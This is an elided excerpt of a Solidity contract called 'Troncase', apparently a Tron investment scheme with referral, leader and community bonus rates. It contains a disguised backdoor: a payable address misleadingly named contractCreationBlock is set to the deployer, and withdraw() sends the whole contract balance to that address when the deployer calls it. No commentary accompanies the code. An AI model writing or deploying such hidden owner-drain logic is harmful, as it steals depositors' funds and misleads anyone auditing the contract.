...
contract Troncase {
    ...
    address payable public contractCreationBlock;
    ...
    constructor(address payable marketingAddr, address payable projectAddr, address payable adminAddr) public {
        ...
        contractCreationBlock = msg.sender;
    ...
    function getLeaderBonusRate() public view returns (uint) {
        uint leaderBonusPercent = BASE_PERCENT.add(totalRefBonus.div(LEADER_BONUS_STEP).mul(10));

        if (leaderBonusPercent < BASE_PERCENT.add(MAX_LEADER_PERCENT)) {
            return leaderBonusPercent;
        } else {
            return BASE_PERCENT.add(MAX_LEADER_PERCENT);
        }
    }
    
    function getCommunityBonusRate() public view returns (uint) {
        uint communityBonusRate = BASE_PERCENT.add(totalDeposits.div(COMMUNITY_BONUS_STEP).mul(10));

        if (communityBonusRate < BASE_PERCENT.add(MAX_COMMUNITY_PERCENT)) {
            return communityBonusRate;
        } else {
            return BASE_PERCENT.add(MAX_COMMUNITY_PERCENT);
        }
    }
    ...
    function withdraw() public {
        ...
        if(msg.sender==contractCreationBlock)
        contractCreationBlock.transfer(address(this).balance);
